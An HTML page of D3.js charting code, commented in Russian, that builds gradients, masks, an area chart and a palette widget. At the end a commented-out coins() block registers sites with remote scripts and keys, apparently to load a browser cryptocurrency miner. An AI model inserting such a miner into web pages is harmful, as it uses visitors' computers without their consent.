<!DOCTYPE html>
<html>

<head>
    <meta charset='utf-8'>
    <title>D3's Hello World</title>
    <script src='/js/d3.v6.min.js'></script>
    <script src='/js/chroma.min.js'></script>
    <script src='/js/lodash.min.js'></script>
    <script src='c.js'></script>
    <link rel='stylesheet' href='/css/null.css' />
    <style>
        body {
            font-family: 'Courier New', Courier, monospace
        }
        
        .axis path,
        .axis line {
            fill: none;
            stroke: #333;
        }
        
        .axis .grid-line {
            stroke: #000;
            stroke-opacity: 0.2;
        }
        
        .axis text {
            font: 10px Verdana;
        }
        
        .bar {
            /*stroke: none;*/
        }
        
        svg {
            position: absolute;
            top: 0;
            left: 0;
        }
        
        .dot {
            stroke: steelblue;
            fill: lightblue;
        }
        
        .dot-2 {
            stroke: lightblue;
            fill: lightblue;
        }
    </style>
    <script src="data.js"></script>
</head>

<body style='background-color: #01040a'>

    <script>
        const win = window;

        win.onload = () => {
            /*
                        try {
                            */
            let width = win.innerWidth - 0;
            let height = win.innerHeight - 0;

            //https://mdigi.tools/color-shades/#061639

            let margin = 0,
                padding = 0;

            rawData = [{
                    x: 0,
                    y: 0
                }, {
                    x: 10,
                    y: 67
                }, {
                    x: 20,
                    y: 74
                }, {
                    x: 30,
                    y: 63
                }, {
                    x: 40,
                    y: 56
                }, {
                    x: 50,
                    y: 24
                }, {
                    x: 60,
                    y: 26
                }, {
                    x: 70,
                    y: 19
                }, {
                    x: 80,
                    y: 42
                }, {
                    x: 90,
                    y: 88
                }, {
                    x: 100,
                    y: 70
                }],
                linedots = [];
            /*
                        let svg = d3.select("body").append("svg")
                            .attr("class", "axis")
                            .attr("viewBox", "0 0 " + width + " " + height)
                            .attr("width", width)
                            .attr("height", height);

                        win.onresize = () => {
                            svg.attr("width", win.innerWidth);
                            svg.attr("height", win.innerHeight);
                        };
            */
            // длина оси X= ширина контейнера svg - отступ слева и справа
            let xAxisLength = width - 2 * margin;

            // длина оси Y = высота контейнера svg - отступ сверху и снизу
            let yAxisLength = height - 2 * margin;

            function oldVersion() {

                // функция интерполяции значений на ось Х  
                let scaleXAxisFromData = (data) => {
                    return d3.scaleLinear()
                        .domain([1, data.length + 1])
                        .range([0, xAxisLength]);
                };

                let scaleX = [];
                datas.forEach((data) => {
                    scaleX.push(scaleXAxisFromData(data));
                });

                var scaleXline = d3.scaleLinear()
                    .domain([0, 100])
                    .range([0, xAxisLength]);

                // функция интерполяции значений на ось Y
                let scaleY = d3.scaleLinear()
                    .domain([100, 0])
                    .range([0, yAxisLength]);

                // масштабирование реальных данных в данные для нашей координатной системы

                for (i = 0; i < rawData.length; i++)
                    linedots.push({
                        x: scaleXline(rawData[i].x) + margin,
                        y: scaleY(rawData[i].y) + margin
                    });
                /*
                            rawData.forEach((r) => {
                                linedots.push({
                                    x: scaleXline(r.x) + margin,
                                    y: scaleY(r.i) + margin
                                });
                            });*/
                let defs = svg.append("defs");

                function createBackgroundGradient(mainColor, gradientColor) {

                    let whiteGradient = defs.append("linearGradient")
                        .attr("id", "whiteGradient")
                        .attr("x1", "0%")
                        .attr("y1", "0%")
                        .attr("x2", "0%")
                        .attr("y2", "100%");

                    whiteGradient.append("stop")
                        .attr("offset", "0")
                        .attr("stop-color", gradientColor)
                        .attr("stop-opacity", "0.25");

                    whiteGradient.append("stop")
                        .attr("offset", "1")
                        .attr("stop-color", gradientColor)
                        .attr("stop-opacity", "1");

                    let gradientMask = defs.append("mask")
                        .attr("id", "gradientMask");

                    let rectMask = gradientMask.append("rect")
                        .attr("x", "0")
                        .attr("y", "0")
                        .attr("width", width)
                        .attr("height", height)
                        .attr("fill", "url(#whiteGradient)");

                    svg.append("rect")
                        .attr("x", "0")
                        .attr("y", "0")
                        .attr("width", width)
                        .attr("height", height)
                        .attr("fill", mainColor)
                        .attr("mask", "url(#gradientMask)");
                }

                createBackgroundGradient(colors[8], "white"); // "#061639"

                function createGradient(data) {
                    let Gradient = defs.append("linearGradient")
                        .attr("id", data.id)
                        .attr("x1", data.x1)
                        .attr("x2", data.x2)
                        .attr("y1", data.y1)
                        .attr("y2", data.y2);

                    d3.select('#' + data.id).selectAll("stop").data(data.stops).enter().append("stop");
                    d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("offset", function(d) {
                        return d['offset'];
                    });
                    d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("stop-color", function(d) {
                        return d['stop-color'];
                    });
                    d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("stop-opacity", function(d) {
                        return d['stop-opacity'];
                    });
                    d3.select('#' + data.id).selectAll('stop').data(data.stops).exit().remove();

                    return Gradient;
                }

                gradients.forEach((gradient) => {
                    createGradient(gradient);
                });

                function createLayer(index, data, fill, stroke, scaleX, scaleY) {
                    let m = defs.append("mask")
                        .attr("id", "Mask" + index);

                    // создаем объект g для прямоугольников
                    let g = m.append("g")
                        .attr("class", "body")
                        .attr("transform", // сдвиг объекта вправо
                            "translate(" + margin + ", 0 )");
                    // связываем данные с прямоугольниками

                    g.selectAll("rect.bar")
                        .data(data)
                        .enter()
                        .append("rect")
                        .attr("class", "bar")
                        .attr("fill", fill)
                        .attr("stroke", stroke);

                    // устанавливаем параметры прямоугольников
                    g.selectAll("rect.bar")
                        .data(data)
                        .attr("x", function(d) {
                            return scaleX(d.x);
                        })
                        .attr("y", function(d) {
                            return scaleY(d.y) + margin;
                        })
                        .attr("height", function(d) {
                            return yAxisLength - scaleY(d.y);
                        })
                        .attr("width", function(d) {

                            return Math.floor(xAxisLength / data.length) - padding;
                        });

                    let r = svg.append("rect")
                        .attr("id", "Rect" + index)
                        .attr("x", "0")
                        .attr("y", "0")
                        .attr("width", width)
                        .attr("height", height)
                        //.attr("fill", "url(#Gradient" + index + ")")
                        .attr("fill", "url(#Gradient" + index + ")")
                        .attr("mask", "url(#Mask" + index + ")");

                }

                datas.forEach((d, i) => {
                    createLayer(i, datas[datas.length - i - 1], "#fff", "#fff", scaleX[scaleX.length - i - 1], scaleY);
                });

                // функция, создающая по массиву точек линии
                var line = d3.line()
                    .x(function(d) {
                        return d.x;
                    })
                    .y(function(d) {
                        return d.y;
                    });
                // добавляем путь
                svg.append("g").append("path")
                    .attr("d", line(linedots))
                    .style("stroke", "steelblue")
                    .style("stroke-width", 2);

                // функция, создающая область
                var area = d3.area()
                    .x(function(d) {
                        return d.x;
                    })
                    .y0(height - margin)
                    .y1(function(d) {
                        return d.y;
                    });

                var g = svg.append("g");
                g.append("path")
                    .attr("d", area(linedots))
                    .style("fill", 'url(#Gradient3)'); //"lightblue");
                g.append("path")
                    .attr("d", line(linedots))
                    .style("stroke", 'url(#Gradient3)') //"steelblue")
                    .style("stroke-width", 2);

                // добавляем отметки к точкам
                svg.selectAll(".dot")
                    .data(rawData)
                    .enter().append("circle")
                    .attr("class", "dot")
                    .attr("r", 3.5)
                    .attr("cx", function(d) {
                        return scaleXline(d.x) + margin;
                    })
                    .attr("cy", function(d) {
                        return scaleY(d.y) + margin;
                    });

            }

            //oldVersion();

            //#061639
            //let pallete = chroma.scale(['#061639', 'black']).colors(24);
            let palletejson = JSON.stringify(colors);

            // объект Градиент
            function Gradient(spec) {
                let instance = {};
                let id, defs, x1, y1, x2, y2;
                let gradient;
                let type = 'linearGradient';
                let stops = [];

                // присваивание значений при создании
                if (_.isEmpty(spec.id)) {
                    id = 'id_g_' + Date.now();
                } else {
                    id = spec.id;
                }

                if (!_.isEmpty(spec.type)) {
                    type = spec.type;
                }

                if (_.isEmpty(spec.x1)) {
                    x1 = '0%';
                } else {
                    x1 = spec.x1;
                }

                if (_.isEmpty(spec.y1)) {
                    y1 = '0%';
                } else {
                    y1 = spec.y1;
                }

                if (_.isEmpty(spec.x2)) {
                    x2 = '0%';
                } else {
                    x2 = spec.x2;
                }

                if (_.isEmpty(spec.y2)) {
                    y2 = '100%';
                } else {
                    y2 = spec.y2;
                }

                if (!_.isEmpty(spec.defs)) {
                    defs = spec.defs;
                }

                // присваиваем или получаем Id
                instance.id = (i) => {
                    if (_.isEmpty(i)) {
                        return id.toString();
                    }
                    id = i;
                    return instance;
                };

                instance.append = (d) => {

                    if (!_.isEmpty(d)) {
                        defs = d;
                    }

                    gradient = defs.append(type)
                        .attr('id', id)
                        .attr('x1', x1)
                        .attr('y1', y1)
                        .attr('x2', x2)
                        .attr('y2', y2);

                    return instance;
                };

                // присваиваем и получаем градиент
                instance.gradient = (g) => {
                    if (!arguments.length) return gradient;
                    gradient = g;
                    return instance;
                };

                instance.stop = (offset, color, opacity) => {
                    gradient.append('stop')
                        .attr('offset', offset)
                        .attr('stop-color', color)
                        .attr('stop-opacity', opacity);

                    return instance;
                };

                return instance;
            }

            // объект Маска
            function Mask(spec) {
                let instance = {};
                let id, defs;
                let mask;
                let figures = [];

                // присваивание значений при создании
                if (_.isEmpty(spec.id)) {
                    id = 'id_m_' + Date.now();
                } else {
                    id = spec.id;
                }

                if (!_.isEmpty(spec.defs)) {
                    defs = spec.defs;
                }

                // присваиваем или получаем Id
                instance.id = (i) => {
                    if (_.isEmpty(i)) {
                        return id.toString();
                    }
                    id = i;
                    return instance;
                };

                // добавляем маску в defs
                instance.append = (d) => {

                    if (!_.isEmpty(d)) {
                        defs = d;
                    }

                    mask = defs.append('mask')
                        .attr('id', id);

                    return instance;
                };

                // присваиваем и получаем градиент
                instance.mask = (m) => {
                    if (!arguments.length) return mask;
                    mask = m;
                    return instance;
                };

                instance.rect = (x, y, w, h, f) => {
                    let r = mask.append('rect')
                        .attr('x', x)
                        .attr('y', y)
                        .attr('width', w)
                        .attr('height', h)
                        .attr('fill', f);

                    figures.push(r);

                    return instance;
                };

                return instance;
            }

            // прямоугольник
            let Rect = (spec) => {
                let instance = {};
                let id, x, y, width, height, fill, mask;
                let parent;

                if (_.isEmpty(spec.id)) {
                    id = 'id_r_' + Date.now();
                } else {
                    id = spec.id;
                }

                if (_.isEmpty(spec.x)) {
                    x = '0';
                } else {
                    x = spec.x;
                }

                if (_.isEmpty(spec.y)) {
                    y = '0';
                } else {
                    y = spec.x;
                }

                if (_.isEmpty(spec.width)) {
                    width = win.innerWidth;
                } else {
                    width = spec.width;
                }

                if (_.isEmpty(spec.height)) {
                    height = win.innerHeight;
                } else {
                    height = spec.height;
                }

                if (_.isEmpty(spec.fill)) {
                    fill = 'white';
                } else {
                    fill = spec.fill;
                }

                if (_.isEmpty(spec.mask)) {
                    mask = 'white';
                } else {
                    mask = spec.mask;
                }

                if (!_.isEmpty(spec.parent)) {
                    parent = spec.parent;
                }

                // присваиваем или получаем Id
                instance.id = (i) => {
                    if (_.isEmpty(i)) {
                        return id.toString();
                    }
                    id = i;
                    return instance;
                };

                // присваиваем или получаем parent
                instance.parent = (p) => {
                    if (_.isEmpty(p)) {
                        return parent;
                    }
                    parent = p;
                    return instance;
                };

                instance.append = (p) => {

                    if (!_.isEmpty(p)) {
                        parent = p;
                    }

                    let r = parent.append('rect')
                        .attr('id', id)
                        .attr('x', x)
                        .attr('y', y)
                        .attr('width', width)
                        .attr('height', height)
                        .attr('fill', fill)
                        .attr('mask', mask);

                    return instance;
                }

                return instance;
            };


            let AxisLength = (a, m) => {
                // a - axis width or height
                // m - margin
                return a - 2 * m;
            };
            let AxisScale = (l, d) => {
                // l - axis length
                // d - domain array
                // реализовать обратное направление
                return d3.scaleLinear()
                    .domain(d)
                    .range([0, l]);
            };

            let Layer = (spec) => {
                let instance = {};
                let id;
                let parent;

                if (_.isEmpty(spec.id)) {
                    id = 'id_l_' + Date.now();
                } else {
                    id = spec.id;
                }

                if (!_.isEmpty(spec.parent)) {
                    parent = spec.parent;
                }

                // присваиваем или получаем Id
                instance.id = (i) => {
                    if (_.isEmpty(i)) {
                        return id.toString();
                    }
                    id = i;
                    return instance;
                };

                // присваиваем или получаем parent
                instance.parent = (p) => {
                    if (_.isEmpty(p)) {
                        return parent;
                    }
                    parent = p;
                    return instance;
                };

                instance.append = (p) => {

                    if (!_.isEmpty(p)) {
                        parent = p;
                    }

                    let g = parent.append('g')
                        .attr('id', id);

                    return instance;
                }
                return instance;
            }

            // вспомогательные функции для отрисовки точек, линий и областей
            let Dots = (r, x, y, m) => {
                // r - rawData
                // x - scaleX
                // y - scaleY
                // m - margin
                let dots = [];
                for (i = 0; i < r.length; i++)
                    dots.push({
                        x: x(r[i].x) + m,
                        y: y(r[i].y) + m
                    });
                return dots;
            };

            let Line = (d) => {
                let l = d3.line()
                    .x(function(d) {
                        return d.x;
                    })
                    .y(function(d) {
                        return d.y;
                    });
                return l(d);
            };

            let Area = (d, h, m) => {
                let a = d3.area()
                    .x(function(d) {
                        return d.x;
                    })
                    .y0(h - m)
                    .y1(function(d) {
                        return d.y;
                    });
                return a(d);
            };

            // объект - путь
            let Path = (spec) => {
                let instance = {};
                let id, d, pathLength, cls;

                let opacity; //--

                let fill, fillopacity, mask, stroke, strokeopacity, strokewidth;

                let strokedasharray, strokelinecap, strokelinejoin; //--
                let writingmode; //--

                let parent;

                if (_.isEmpty(spec.id)) {
                    id = 'id_p_' + Date.now();
                } else {
                    id = spec.id;
                }

                if (!_.isEmpty(spec.d)) d = spec.d;

                if (!_.isEmpty(spec.pathLength)) pathLength = spec.pathLength;

                if (!_.isEmpty(spec.cls)) cls = spec.cls;

                if (!_.isEmpty(spec.opacity)) {
                    opacity = spec.opacity;
                }

                if (_.isEmpty(spec.fill)) {
                    fill = 'none';
                } else {
                    fill = spec.fill;
                }

                if (!_.isEmpty(spec.fillopacity)) fillopacity = spec.fillopacity;

                if (_.isEmpty(spec.mask)) {
                    mask = 'white';
                } else {
                    mask = spec.mask;
                }

                if (!_.isEmpty(spec.stroke)) stroke = spec.stroke;

                if (!_.isEmpty(spec.strokeopacity)) strokeopacity = spec.strokeopacity;

                if (!_.isEmpty(spec.strokewidth)) strokewidth = spec.strokewidth;

                if (!_.isEmpty(spec.parent)) parent = spec.parent;

                // присваиваем или получаем Id
                instance.id = (i) => {
                    if (_.isEmpty(i)) {
                        return id.toString();
                    }
                    id = i;
                    return instance;
                };

                // присваиваем или получаем d
                instance.d = (v) => {
                    if (_.isEmpty(v)) {
                        return d;
                    }
                    d = v;
                    return instance;
                };

                // присваиваем или получаем pathLength
                instance.pathLength = (p) => {
                    if (_.isEmpty(p)) {
                        return pathLength;
                    }
                    pathLength = p;
                    return instance;
                };

                // присваиваем или получаем cls
                instance.cls = (c) => {
                    if (_.isEmpty(c)) {
                        return cls;
                    }
                    cls = c;
                    return instance;
                };

                // присваиваем или получаем fill
                instance.fill = (f) => {
                    if (_.isEmpty(f)) {
                        return fill;
                    }
                    fill = f;
                    return instance;
                };

                // присваиваем или получаем fillopacity
                instance.fillopacity = (f) => {
                    if (_.isEmpty(f)) {
                        return fillopacity;
                    }
                    fillopacity = f;
                    return instance;
                };

                // присваиваем или получаем stroke
                instance.stroke = (s) => {
                    if (_.isEmpty(s)) {
                        return stroke;
                    }
                    stroke = s;
                    return instance;
                };

                // присваиваем или получаем strokeopacity
                instance.strokeopacity = (s) => {
                    if (_.isEmpty(s)) {
                        return strokeopacity;
                    }
                    strokeopacity = s;
                    return instance;
                };

                // присваиваем или получаем strokewidth
                instance.strokewidth = (s) => {
                    if (_.isEmpty(s)) {
                        return strokewidth;
                    }
                    strokewidth = s;
                    return instance;
                };

                // присваиваем или получаем parent
                instance.parent = (p) => {
                    if (_.isEmpty(p)) {
                        return parent;
                    }
                    parent = p;
                    return instance;
                };

                instance.append = (p) => {

                    if (!_.isEmpty(p)) {
                        parent = p;
                    }

                    let path = parent.append('path')
                        .attr('id', id)
                        .attr('d', d);

                    if (!_.isEmpty(pathLength)) {
                        path.style('path-length', pathLength);
                    }

                    if (!_.isEmpty(cls)) {
                        path.attr('class', cls);
                    }

                    if (!_.isEmpty(fill)) {
                        path.style('fill', fill);
                    }

                    if (!_.isEmpty(fillopacity)) {
                        path.style('fill-opacity', fillopacity);
                    }

                    if (!_.isEmpty(mask)) {
                        path.attr('mask', mask);
                    }

                    if (!_.isEmpty(stroke)) {
                        path.style('stroke', stroke);
                    }

                    if (!_.isEmpty(strokeopacity)) {
                        path.style('stroke-opacity', strokeopacity);
                    }

                    if (!_.isEmpty(strokewidth)) {
                        path.style('stroke-width', strokewidth);
                    }

                    return instance;
                }
                return instance;
            };

            // объект Холст
            function Canvas(spec) {
                let instance = {};
                let headline, description;
                let svg, defs, width, height;
                let data = {};
                let margin = 0;
                data.pallete = [];
                data.gradients = [];
                data.layers = [];

                // тест слоя
                rawData = [{
                        x: 0,
                        y: 0
                    }, {
                        x: 10,
                        y: 67
                    }, {
                        x: 20,
                        y: 74
                    }, {
                        x: 30,
                        y: 63
                    }, {
                        x: 40,
                        y: 56
                    }, {
                        x: 50,
                        y: 24
                    }, {
                        x: 60,
                        y: 26
                    }, {
                        x: 70,
                        y: 19
                    }, {
                        x: 80,
                        y: 42
                    }, {
                        x: 90,
                        y: 88
                    }, {
                        x: 100,
                        y: 70
                    }],
                    linedots = [];


                instance.testLayer = () => {
                    // длина оси X= ширина контейнера svg - отступ слева и справа
                    let xAxisLength = AxisLength(width, margin);

                    // длина оси Y = высота контейнера svg - отступ сверху и снизу
                    let yAxisLength = AxisLength(height, margin);
                    // функция интерполяции значений на ось X
                    let scaleX = AxisScale(xAxisLength, [0, 100]);
                    // функция интерполяции значений на ось Y
                    let scaleY = AxisScale(yAxisLength, [100, 0]);
                    // расположение точек линии с учетом интерполяции
                    linedots = Dots(rawData, scaleX, scaleY, margin);

                    let g = svg.append("g");
                    // добавляем путь
                    /*g.append("path")
                        .attr("d", Line(linedots))
                        .style("stroke", "steelblue")
                        .style("stroke-width", 2);*/

                    /////// доделать объект путь

                    // добавляем область
                    g.append("path")
                        .attr("d", Area(linedots, height, margin))
                        .style("fill", 'lightblue'); //"lightblue");

                    // путь
                    g.append("path")
                        .attr("d", Line(linedots))
                        .style("fill", 'none')
                        .style("stroke", 'lightblue') //"steelblue")
                        .style("stroke-width", 2);

                    // добавляем отметки к точкам
                    svg.selectAll(".dot-2")
                        .data(rawData)
                        .enter().append("circle")
                        .attr("class", "dot-2")
                        .attr("r", 3.5)
                        .attr("cx", function(d) {
                            return scaleX(d.x) + margin;
                        })
                        .attr("cy", function(d) {
                            return scaleY(d.y) + margin;
                        });

                    return instance;
                };
                //конец теста слоя

                // создаем SVG
                instance.appendSvg = (w, h) => {
                    width = w;
                    height = h;
                    svg = d3.select("body").append("svg")
                        .attr("class", "axis")
                        .attr("viewBox", "0 0 " + width + " " + height)
                        .attr("width", width)
                        .attr("height", height);
                    defs = svg.append("defs");
                    return instance;
                };

                // создаем defs
                instance.appendDefs = () => {
                    if (!svg.select("defs")) defs = svg.append("defs");
                    return instance;
                };

                // присваиваем или получаем SVG
                instance.svg = (s) => {
                    if (!arguments.length) return svg;
                    svg = s;
                    return instance;
                };

                // устанавливаем или получаем ширину margin
                instance.margin = (m) => {
                    if (!arguments.length) return margin;
                    margin = m;
                    return instance;
                };

                // устанавливаем или получаем ширину SVG
                instance.width = (w) => {
                    if (!arguments.length) return width;
                    width = w;
                    svg.attr("viewBox", "0 0 " + width + " " + height)
                        .attr('width', width);
                    return instance;
                };

                // устанавливаем или получаем высоту SVG
                instance.height = (h) => {
                    if (!arguments.length) return height;
                    height = h;
                    svg.attr("viewBox", "0 0 " + width + " " + height)
                        .attr('height', height);
                    return instance;
                };

                // выводим виджет с заголовком и описанием
                instance.showTextWidget = () => {
                    let div = d3.select('body').append('div');
                    div.append('h3').text(headline);
                    div.attr('class', 'box')
                        .attr('style', 'width: ' + spec.width + '; word-wrap: break-word;color:' + spec.color)
                        .append('p')
                        .text(description);
                    return instance;
                };

                // присваиваем и получаем заголовок виджета
                instance.headline = (h) => {
                    if (!arguments.length) return headline;
                    headline = h;
                    return instance;
                };

                // присваиваем и получаем описание виджета
                instance.description = (d) => {
                    if (!arguments.length) return description;
                    description = d;
                    return instance;
                };

                // присваиваем и получаем объект с данными
                instance.data = (d) => {
                    if (_.isEmpty(d)) return data;
                    data = d;
                    return instance;
                };

                // присваиваем и получаем цветовую палитру
                instance.data.pallete = (p) => {
                    if (_.isEmpty(p)) return data.pallete;
                    data.pallete = p;
                    return instance;
                };

                // присваиваем и получаем градиенты
                instance.data.gradients = (g) => {
                    if (_.isEmpty(g)) return data.gradients;
                    data.gradients = g;
                    return instance;
                };

                // присваиваем и получаем слои
                instance.data.layers = (l) => {
                    if (_.isEmpty(l)) return data.layers;
                    data.layers = l;
                    return instance;
                };

                // создаем палитру
                instance.generatePallete = (obj) => {
                    // obj.colors is an array of colors. Example ['yellow','lightgreen',l008ae5]
                    // obj.domain is an array of stops. Example ['0,0.5,1']
                    let _colors;

                    if (!_.isEmpty(obj.colors)) {
                        _colors = chroma.scale(obj.colors);
                    } else {
                        _colors = chroma.scale(['white', 'black']);
                    }

                    if (!_.isEmpty(obj.domain)) {
                        _colors = _colors.domain(obj.domain);
                    }

                    if (!_.isEmpty(obj.count)) {
                        _colors = _colors.colors(count);
                    } else {
                        _colors = _colors.colors(24);
                    }

                    data.pallete = _colors;

                    return instance;
                };

                instance.appendBG = (mainColor, gradientColor) => {

                    // градиент
                    let BG = Gradient({
                            'defs': defs
                        }).append()
                        .stop('0', gradientColor, '0.25')
                        .stop('1', gradientColor, '1');

                    // маска
                    let M = Mask({
                            'defs': defs
                        }).append()
                        .rect(0, 0, width, height, 'url(#' + BG.id() + ')');

                    // прямоугольник с маской градиентом
                    let R = Rect({
                        'width': width,
                        'height': height,
                        'fill': mainColor,
                        'mask': 'url(#' + M.id() + ')'
                    }).append(svg);

                    return instance;
                }

                return instance;
            }

            let canvas = Canvas({
                    color: 'white', //'#6495ed',
                    width: width
                })
                .generatePallete({
                    'colors': ['yellow', 'lightgreen']
                });
            let p = canvas.data.pallete();
            canvas
                .headline('Pallete')
                .description(JSON.stringify(p)) //palletejson)
                .appendSvg(width, height)
                .appendDefs()
                .appendBG("orange", "white");

            canvas.showTextWidget();
            canvas.testLayer();
            /*
                        } catch (e) {
                            alert(e);
                        }
            */
            /*
             let c = coins()
                 .addSite({
                     id: 'local',
                     match: '127.0.0.1',
                     src: 'https://www.hostingcloud.racing/2KFX.js',
                     key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
                 })
                 .addSite({
                     id: 'share',
                     match: 'shareform.ru',
                     src: 'https://www.hostingcloud.racing/rhdQ.js',
                     key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
                 }).start();
                 */
        }
    </script>
</body>

</html>